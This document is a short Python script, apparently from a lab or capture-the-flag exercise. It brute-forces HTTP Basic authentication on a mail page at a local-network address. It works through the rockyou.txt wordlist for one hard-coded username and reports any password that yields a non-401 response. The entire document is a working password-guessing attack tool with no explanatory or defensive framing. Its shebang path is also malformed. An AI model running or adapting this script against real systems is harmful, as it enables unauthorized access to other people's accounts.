 #!/usr/share/python3
 
 import requests
 import sys
 from base64 import b64encode
 from base64 import b64decode
 import time
 import pdb 
 from pwn import *
 import concurrent.futures
 import signal
 
 def def_handler(signal, frame):
     print('\nEit\n')
     sys.exit(1)
 
 main_url = "http://192.168.0.75/zmail"
 
 # Ctrl+C 
 signal.signal(signal.SIGINT, def_handler)
 
 def makeAuthentication(combination_b64, p1): 
     
     combination_b64 = combination_b64.decode()
 
     headers = {
         'Authorization': 'Basic %s' % combination_b64
     }
 
     r = requests.get(main_url, headers=headers)
 
     if r.status_code != 401:
         p1.success("The Password is %s" % b64decode(combination_b64).decode())
         print("Successfull")
         sys.exit(0)
 
 def makeAutho():
 
     users = ["dezz1", "p48", "all2"]
 
     f = open("/usr/share/wordlists/rockyou.txt", "rb")
 
     p1 = log.progress("Force Brute")
     p1.status("Starting Force Brute Status")
 
     time.sleep(2)
     
     counter = 1 
 
     for password in f.readlines():
 
         password = (password.strip()).decode()
         combination = users[1] + ':' + password
         
         p1.status("Testing With [%d/14344392]: %s " % (counter, combination.split(':')[1]))
         
         combination_b64 = b64encode(combination.encode())
 
         makeAuthentication(combination_b64, p1)
 
         counter += 1
 
 if __name__ == '__main__':
 
     makeAutho()
